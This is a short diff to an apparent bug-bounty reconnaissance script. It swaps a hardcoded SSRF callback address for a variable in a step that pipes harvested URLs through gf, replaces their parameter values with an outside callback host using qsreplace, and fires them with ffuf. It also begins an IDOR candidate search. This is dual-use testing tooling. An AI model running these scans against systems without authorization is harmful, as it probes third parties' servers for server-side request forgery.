@@ -107,7 +107,7 @@ vulnscan()
   ss="$ssrf"            #ssrftest.com or ngrok or burp private collaborator or canary token
   cd "$current"/"$domain"/"$subdirectory"/URLs/
   cat clean_url.txt spider_clean_1.txt spider_clean_2.txt | grep "=" | gf ssrf | tee -a ../vulns/possible_ssrf.txt
-  cat ../vulns/possible_ssrf.txt | qsreplace "http://ssrftest.com/x/kVTj1" | tee -a ../vulns/possible_ssrf_2.txt
+  cat ../vulns/possible_ssrf.txt | qsreplace "$ssrf" | tee -a ../vulns/possible_ssrf_2.txt
   ffuf -w ../vulns/possible_ssrf_2.txt -u FUZZ -t 100 -of html -o ../vulns/ssrf_2_result_ffuf.html
 #IDOR
   cat clean_url.txt spider_clean_1.txt spider_clean_2.txt | grep "=" | gf idor | tee -a ../vulns/possible_idor.txt
